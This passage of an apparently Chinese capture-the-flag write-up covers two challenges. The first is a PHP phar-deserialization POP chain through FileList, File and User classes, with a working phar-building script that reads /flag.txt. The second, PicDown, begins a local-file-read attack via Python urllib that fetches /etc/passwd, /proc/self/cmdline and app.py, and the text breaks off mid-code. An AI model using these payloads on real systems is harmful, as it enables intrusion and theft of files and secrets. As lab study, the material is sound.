class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>吗的看的头都大了。。</p><p><code>__call</code>弄了个多维数组出来：<code>results[$file-&gt;name()][$func]</code>，即<code>results[文件名][函数名]=[调用结果]</code>。</p><p>遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results多维数组，接下来的<code>_destruct</code>函数会将<code>FileList</code>对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以知道，index.php里创建了一个FileList对象，在脚本执行完毕后触发<code>_destruct</code>）。</p><p><code>__destruct()</code>就是把上面的多维数组遍历然后输出。</p><p><code>new</code>了一个<code>File</code>类，我们跟踪到该类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这个<code>close()</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显我们可以依靠<code> return file_get_contents($this-&gt;filename)</code>去读<code>flag.php</code>或<code>flag/txt</code>之类的文件，(这道题是读<code>flag.txt</code>，为什么读这个文件可以看<code>download.php</code>的过滤内容。)</p><p>但注意这个函数是没回显的，我们要想办法把读到的结果回显出来，这时想到了刚才<code>FileList</code>下的<code>__destruct()</code>函数。但从<code>Filelist</code>类下是没法直接触发<code>__call</code>方法和<code>close()</code>的，不过：</p><p><code>User</code>类下存在<code>_destruct()</code>方法;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br><span class="hljs-comment">// 也就是说如果db=FileList类的实例，就变成了FileList-&gt;close();</span><br></code></pre></td></tr></table></figure><p>当执行<code>FileList-&gt;close()</code>时，因为FileList类中没有<code>close()</code>这个方法所以调用<code>FileList</code>-&gt;<code>_call()</code>从而遍历全文件找<code>close()</code>方法。找到了<code>File-&gt;close()</code>就执行了读取文件内容的操作<code>file_get_contents($filename)</code>并给他的结果返回<code>FileList-&gt;$results</code>,最后<code>FileList-&gt;_destruct()</code>方法输出了这个结果。</p><p><code>User中的__destruct</code> &#x3D; &gt; <code>FileList-&gt;close</code> &#x3D; &gt; <code>Filelist-&gt;__call(&#39;close&#39;)</code> &#x3D;&gt;<code>File-&gt;close(&#39;/flag.txt&#39;)</code>&#x3D; &gt;<code>$results=file_get_contents(&#39;flag.txt&#39;)</code>&#x3D;&gt;<code>FileList-&gt;_destruct()</code> &#x3D;&gt; <code>echo $result</code>。</p><p>再梳理一下这个过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br><span class="hljs-comment">//这时我们可以令db = new Filelist()，变成$this-&gt;new Filelist -&gt;close();</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//func为close()，令$this-&gt;files[]=new File();去调用File中的close()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><span class="hljs-comment">//令$this-&gt;filename = /flag.txt,结果被存到$results这个多维数组中</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br><span class="hljs-comment">//Filelist实例化对象销毁时，触发__destruct魔术方法将结果输出</span><br></code></pre></td></tr></table></figure><p>然后注意<code>phar</code>反序列化触发条件之一是要存在一些受影响的操作数：</p><p><img src="/img/dropbox14.png" alt="dropbox14"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//File类中的open函数，这个函数在很多地方被调用</span><br></code></pre></td></tr></table></figure><p>所以存在<code>phar</code>反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();<br>   &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;files[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag.txt&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pharphar.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后要注意的点就是<code>download.php</code>下存在这么个东西：</p><p><code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><img src="/img/dropbox11.png" alt="dropbox11"></p><p>所以反序列化要在<code>delate.php</code>页面下触发。</p><p><code>filename=phar://pharphar.jpg</code></p><p><img src="/img/picdown15.png" alt="picdown15"></p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><img src="/img/picdown1.png" alt="picdown1"></p><p>？？？</p><p><img src="/img/picdown2.png" alt="picdown2"></p><p>？？？</p><p>随便输点东西回车，注意<code>URL</code>：</p><p><img src="/img/picdown3.png" alt="picdown3"></p><p>随便输了些网站都没啥反应，想到<code>URL</code>可以利用<code>file</code>读本地文件。。但读啥也不知道。。</p><p>参考：<code>https://www.cnblogs.com/Article-kelp/p/16095712.html</code></p><p>首先得知道这题用的是<code>python2</code>的<code>urllib</code>的<code>urlopen</code>，和<code>urllib2</code>中的<code>urlopen</code>明显区别就是<code>urllib.urlopen</code>支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件。</p><p>比如<code>/etc/passwd</code>这东西算是一个文件路径而不是<code>URL</code>，但仍可以通过输入路径读取文件：</p><p><img src="/img/picdonw2.png" alt="picdonw2"></p><p>接下来就是<code>proc</code>目录利用，主要就是下面这些东西：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#参考：https://www.anquanke.com/post/id/241148</span><br><span class="hljs-comment">#self代替了pid，这里指的是当前运行的进程</span><br><span class="hljs-regexp">/proc/</span>self/cmdline 启动当前进程的完整命令<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span> 指向当前进程的运行目录<br><span class="hljs-regexp">/proc/</span>self/exe 指向启动当前进程的可执行文件<br><span class="hljs-regexp">/proc/</span>self/environ 当前进程的环境变量列表<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/fd/</span> 当前进程已打开文件的文件描述符<br></code></pre></td></tr></table></figure><p><code>page?url=/proc/self/cmdline</code></p><p><img src="/img/picdown5.png" alt="picdown5"></p><p><code>page?url=/app.py</code></p><p><img src="/img/picdown6.png" alt="picdown6"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">manager</span>():<br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == 